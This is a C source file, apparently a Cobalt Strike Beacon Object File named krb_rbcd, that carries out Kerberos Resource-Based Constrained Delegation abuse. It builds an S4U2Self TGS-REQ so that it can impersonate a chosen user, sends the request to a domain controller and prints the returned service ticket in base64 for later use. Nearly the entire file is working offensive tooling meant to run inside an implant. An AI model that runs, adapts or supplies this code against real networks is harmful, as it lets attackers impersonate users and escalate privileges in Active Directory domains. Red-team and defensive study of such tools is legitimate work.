/*
 * krb_rbcd - Resource-Based Constrained Delegation abuse
 *
 * Performs S4U2Self to obtain a service ticket for a user to a service
 * where the attacker has control over msDS-AllowedToActOnBehalfOfOtherIdentity.
 *
 * Usage: krb_rbcd /user:TARGETUSER /service:SPN /impersonateuser:USER
 *                 /ticket:TGT_BASE64 [/domain:DOMAIN] [/dc:DC]
 */

/* Include krb5_struct.h first - it includes winsock2.h before windows.h */
#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* Helper: allocate and base64 encode using krb5_utils functions */
static char* b64_encode_alloc(const BYTE* data, size_t len) {
    size_t out_len = 4 * ((len + 2) / 3) + 1;
    char* encoded = (char*)malloc(out_len);
    if (!encoded) return NULL;
    base64_encode(data, len, encoded);
    return encoded;
}

/* Helper: allocate and base64 decode using krb5_utils functions */
static BYTE* b64_decode_alloc(const char* encoded, size_t* out_len) {
    size_t len = strlen(encoded);
    size_t max_out = len / 4 * 3 + 1;
    BYTE* decoded = (BYTE*)malloc(max_out);
    if (!decoded) return NULL;

    *out_len = base64_decode(encoded, len, decoded);
    if (*out_len == 0) {
        free(decoded);
        return NULL;
    }
    return decoded;
}

/* Build TGS-REQ for S4U2Self */
static void build_s4u2self_request(KRB_BUFFER* out, const char* domain,
                                    const char* service, const char* impUser,
                                    const BYTE* tgt, size_t tgtLen) {
    KRB_BUFFER tgsreq, pvno, msg_type, padata, req_body;
    KRB_BUFFER body, tmp, etype_seq, etype_list;
    BYTE kdc_opts[4];
    DWORD kdc_options = KDCOPTION_FORWARDABLE | KDCOPTION_RENEWABLE | KDCOPTION_CANONICALIZE;

    buf_init(&tgsreq, 4096);
    buf_init(&pvno, 16);
    buf_init(&msg_type, 16);
    buf_init(&padata, 2048);
    buf_init(&req_body, 1024);
    buf_init(&body, 1024);
    buf_init(&tmp, 512);
    buf_init(&etype_seq, 64);
    buf_init(&etype_list, 64);

    /* Protocol version */
    asn1_encode_integer(&pvno, KRB5_PVNO);
    asn1_context_wrap(&tgsreq, 1, &pvno);

    /* Message type */
    asn1_encode_integer(&msg_type, KRB5_TGS_REQ);
    asn1_context_wrap(&tgsreq, 2, &msg_type);

    /* PA-DATA - TGT */
    {
        KRB_BUFFER pa_tgs, pa_type, pa_value;
        buf_init(&pa_tgs, 2048);
        buf_init(&pa_type, 16);
        buf_init(&pa_value, 2048);

        /* PA-TGS-REQ */
        asn1_encode_integer(&pa_type, PADATA_TGS_REQ);
        asn1_context_wrap(&pa_tgs, 1, &pa_type);

        /* AP-REQ with TGT would go here - simplified */
        asn1_encode_octet_string(&pa_value, tgt, tgtLen);
        asn1_context_wrap(&pa_tgs, 2, &pa_value);

        asn1_wrap(&tmp, ASN1_SEQUENCE, &pa_tgs);
        buf_append(&padata, tmp.data, tmp.length);

        buf_free(&pa_tgs);
        buf_free(&pa_type);
        buf_free(&pa_value);
    }
    buf_reset(&tmp);

    /* PA-FOR-USER for S4U2Self */
    {
        KRB_BUFFER pa_s4u, pa_type, pa_value;
        KRB_BUFFER for_user, user_name, user_realm;
        buf_init(&pa_s4u, 512);
        buf_init(&pa_type, 16);
        buf_init(&pa_value, 512);
        buf_init(&for_user, 256);
        buf_init(&user_name, 128);
        buf_init(&user_realm, 128);

        asn1_encode_integer(&pa_type, PADATA_FOR_USER);
        asn1_context_wrap(&pa_s4u, 1, &pa_type);

        /* Build PA-FOR-USER structure */
        /* userName */
        {
            KRB_BUFFER name_type, name_string, name_seq;
            buf_init(&name_type, 16);
            buf_init(&name_string, 128);
            buf_init(&name_seq, 256);

            asn1_encode_integer(&name_type, KRB5_NT_ENTERPRISE);
            asn1_context_wrap(&name_seq, 0, &name_type);

            asn1_encode_general_string(&tmp, impUser);
            asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
            asn1_context_wrap(&name_seq, 1, &name_string);

            asn1_wrap(&user_name, ASN1_SEQUENCE, &name_seq);
            asn1_context_wrap(&for_user, 0, &user_name);

            buf_free(&name_type);
            buf_free(&name_string);
            buf_free(&name_seq);
        }
        buf_reset(&tmp);

        /* userRealm */
        asn1_encode_general_string(&user_realm, domain);
        asn1_context_wrap(&for_user, 1, &user_realm);

        /* Wrap for-user */
        asn1_wrap(&pa_value, ASN1_SEQUENCE, &for_user);
        asn1_context_wrap(&pa_s4u, 2, &pa_value);

        asn1_wrap(&tmp, ASN1_SEQUENCE, &pa_s4u);
        buf_append(&padata, tmp.data, tmp.length);

        buf_free(&pa_s4u);
        buf_free(&pa_type);
        buf_free(&pa_value);
        buf_free(&for_user);
        buf_free(&user_name);
        buf_free(&user_realm);
    }
    buf_reset(&tmp);

    /* Wrap padata sequence */
    asn1_wrap(&tmp, ASN1_SEQUENCE, &padata);
    asn1_context_wrap(&tgsreq, 3, &tmp);
    buf_reset(&tmp);


    /* KDC options */
    kdc_opts[0] = (kdc_options >> 24) & 0xFF;
    kdc_opts[1] = (kdc_options >> 16) & 0xFF;
    kdc_opts[2] = (kdc_options >> 8) & 0xFF;
    kdc_opts[3] = kdc_options & 0xFF;
    asn1_encode_bit_string(&tmp, kdc_opts, 4, 0);
    asn1_context_wrap(&body, 0, &tmp);
    buf_reset(&tmp);

    /* Realm */
    asn1_encode_general_string(&tmp, domain);
    asn1_context_wrap(&body, 2, &tmp);
    buf_reset(&tmp);

    /* Server principal (target service) */
    {
        KRB_BUFFER name_type, name_string, name_seq;
        char svc_name[128], svc_host[128];
        char* slash = strchr(service, '/');

        buf_init(&name_type, 16);
        buf_init(&name_string, 256);
        buf_init(&name_seq, 512);

        if (slash) {
            size_t svc_len = slash - service;
            strncpy(svc_name, service, svc_len);
            svc_name[svc_len] = '\0';
            strcpy(svc_host, slash + 1);
        } else {
            strcpy(svc_name, service);
            svc_host[0] = '\0';
        }

        asn1_encode_integer(&name_type, KRB5_NT_SRV_INST);
        asn1_context_wrap(&name_seq, 0, &name_type);

        asn1_encode_general_string(&tmp, svc_name);
        if (svc_host[0]) {
            KRB_BUFFER host_str;
            buf_init(&host_str, 128);
            asn1_encode_general_string(&host_str, svc_host);
            buf_append(&tmp, host_str.data, host_str.length);
            buf_free(&host_str);
        }
        asn1_wrap(&name_string, ASN1_SEQUENCE, &tmp);
        asn1_context_wrap(&name_seq, 1, &name_string);

        buf_reset(&tmp);
        asn1_wrap(&tmp, ASN1_SEQUENCE, &name_seq);
        asn1_context_wrap(&body, 3, &tmp);

        buf_free(&name_type);
        buf_free(&name_string);
        buf_free(&name_seq);
    }
    buf_reset(&tmp);

    /* Supported encryption types */
    asn1_encode_integer(&tmp, ETYPE_AES256_CTS_HMAC_SHA1);
    buf_append(&etype_list, tmp.data, tmp.length);
    buf_reset(&tmp);
    asn1_encode_integer(&tmp, ETYPE_AES128_CTS_HMAC_SHA1);
    buf_append(&etype_list, tmp.data, tmp.length);
    buf_reset(&tmp);
    asn1_encode_integer(&tmp, ETYPE_RC4_HMAC);
    buf_append(&etype_list, tmp.data, tmp.length);

    asn1_wrap(&etype_seq, ASN1_SEQUENCE, &etype_list);
    asn1_context_wrap(&body, 8, &etype_seq);


    asn1_wrap(&req_body, ASN1_SEQUENCE, &body);
    asn1_context_wrap(&tgsreq, 4, &req_body);


    asn1_wrap(out, ASN1_APP(KRB5_TGS_REQ), &tgsreq);

    buf_free(&tgsreq);
    buf_free(&pvno);
    buf_free(&msg_type);
    buf_free(&padata);
    buf_free(&req_body);
    buf_free(&body);
    buf_free(&tmp);
    buf_free(&etype_seq);
    buf_free(&etype_list);
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* targetUser = NULL;
    char* service = NULL;
    char* impUser = NULL;
    char* ticket_b64 = NULL;
    char* domain = NULL;
    char* dc = NULL;

    BeaconFormatAlloc(&output, 16384);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: S4U2Self/RBCD Attack\n\n");


    targetUser = arg_get(&parser, "user");
    service = arg_get(&parser, "service");
    impUser = arg_get(&parser, "impersonateuser");
    ticket_b64 = arg_get(&parser, "ticket");
    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");

    if (!service || !impUser) {
        BeaconFormatPrintf(&output, "[-] Error: /service:SPN and /impersonateuser:USER required\n\n");
        BeaconFormatPrintf(&output, "Usage: krb_rbcd /service:cifs/target.domain.local /impersonateuser:admin\n");
        BeaconFormatPrintf(&output, "               [/ticket:TGT_BASE64] [/domain:DOMAIN] [/dc:DC]\n\n");
        BeaconFormatPrintf(&output, "This performs S4U2Self to get a service ticket as the impersonated user.\n");
        BeaconFormatPrintf(&output, "The target service must have RBCD configured to allow this machine.\n");
        goto cleanup;
    }

    if (!domain) {
        domain = get_domain_from_env();
        if (!domain) {
            BeaconFormatPrintf(&output, "[-] Error: Could not determine domain. Use /domain:DOMAIN\n");
            goto cleanup;
        }
    }

    if (!dc) {
        BeaconFormatPrintf(&output, "[-] Error: /dc:DC_IP required\n");
        goto cleanup;
    }

    BeaconFormatPrintf(&output, "[*] Target service: %s\n", service);
    BeaconFormatPrintf(&output, "[*] Impersonate user: %s\n", impUser);
    BeaconFormatPrintf(&output, "[*] Domain: %s\n", domain);
    BeaconFormatPrintf(&output, "[*] DC: %s\n", dc);

    if (ticket_b64) {
        BeaconFormatPrintf(&output, "[*] Using provided TGT\n");

        size_t tgt_len;
        BYTE* tgt = b64_decode_alloc(ticket_b64, &tgt_len);
        if (!tgt) {
            BeaconFormatPrintf(&output, "[-] Failed to decode TGT\n");
            goto cleanup;
        }

        BeaconFormatPrintf(&output, "[*] TGT size: %d bytes\n", (int)tgt_len);

        /* Build and send S4U2Self request */
        WSADATA wsaData;
        if (WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            BeaconFormatPrintf(&output, "[-] WSAStartup failed\n");
            free(tgt);
            goto cleanup;
        }

        SOCKET sock = connect_to_kdc(dc, KRB5_PORT);
        if (sock == INVALID_SOCKET) {
            BeaconFormatPrintf(&output, "[-] Failed to connect to KDC\n");
            WS2_32$WSACleanup();
            free(tgt);
            goto cleanup;
        }

        KRB_BUFFER request;
        buf_init(&request, 4096);
        build_s4u2self_request(&request, domain, service, impUser, tgt, tgt_len);

        BeaconFormatPrintf(&output, "[*] Sending S4U2Self TGS-REQ (%d bytes)...\n", (int)request.length);

        if (send_krb_msg(sock, request.data, request.length) > 0) {
            BYTE response[8192];
            int recv_len = recv_krb_msg(sock, response, sizeof(response));

            if (recv_len > 4) {
                BYTE* resp_data = response + 4;
                int resp_len = recv_len - 4;

                if (resp_data[0] == 0x6D) {
                    /* TGS-REP */
                    BeaconFormatPrintf(&output, "[+] Received TGS-REP!\n");
                    BeaconFormatPrintf(&output, "[+] S4U2Self successful - got service ticket as %s\n", impUser);

                    char* b64 = b64_encode_alloc(resp_data, resp_len);
                    if (b64) {
                        BeaconFormatPrintf(&output, "\n[*] Service Ticket (base64):\n");
                        size_t b64len = strlen(b64);
                        for (size_t i = 0; i < b64len; i += 76) {
                            BeaconFormatPrintf(&output, "  %.76s\n", b64 + i);
                        }
                        free(b64);
                    }
                } else if (resp_data[0] == 0x7E) {
                    /* KRB-ERROR */
                    BeaconFormatPrintf(&output, "[-] Received KRB-ERROR\n");
                    BeaconFormatPrintf(&output, "[!] S4U2Self may not be allowed for this service\n");
                } else {
                    BeaconFormatPrintf(&output, "[?] Unknown response type: 0x%02X\n", resp_data[0]);
                }
            }
        } else {
            BeaconFormatPrintf(&output, "[-] Failed to send request\n");
        }

        buf_free(&request);
        WS2_32$closesocket(sock);
        WS2_32$WSACleanup();
        free(tgt);
    } else {
        BeaconFormatPrintf(&output, "\n[!] No TGT provided - using current session\n");
        BeaconFormatPrintf(&output, "[!] For full RBCD attack, provide TGT with /ticket:BASE64\n");
        BeaconFormatPrintf(&output, "[!] Use krb_s4u for S4U attacks with current credentials\n");
    }

cleanup:
    if (targetUser) free(targetUser);
    if (service) free(service);
    if (impUser) free(impUser);
    if (ticket_b64) free(ticket_b64);
    if (domain) free(domain);
    if (dc) free(dc);

    BeaconPrintf(CALLBACK_OUTPUT, "%s", BeaconFormatToString(&output, NULL));
    BeaconFormatFree(&output);
}
